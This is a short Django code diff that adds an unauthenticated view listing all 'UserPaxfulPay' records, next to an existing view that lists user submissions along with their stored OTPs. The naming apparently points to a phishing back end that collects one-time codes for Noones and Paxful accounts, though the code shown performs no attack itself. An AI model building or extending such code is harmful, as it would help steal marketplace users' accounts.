@@ -1106,7 +1106,7 @@ def infodbnoonesold(request):
 
 
 #noones new
-#viewspax
+
 
 @csrf_exempt
 def noones(request):
@@ -1165,3 +1165,13 @@ def verify(request, submission_id):
 def infodbnoones(request):
     user_submissions = UserSubmissionNoones.objects.all().prefetch_related('otps')
     return render(request, 'view_all.html', {'user_submissions': user_submissions})
+
+
+
+
+#noonespaxfulpay
+def noones_receive(request):
+    users = UserPaxfulPay.objects.all()  # Correctly access the UserNoonesPay model
+    return render(request, 'noonespayclient.html', {'users': users})
+
+
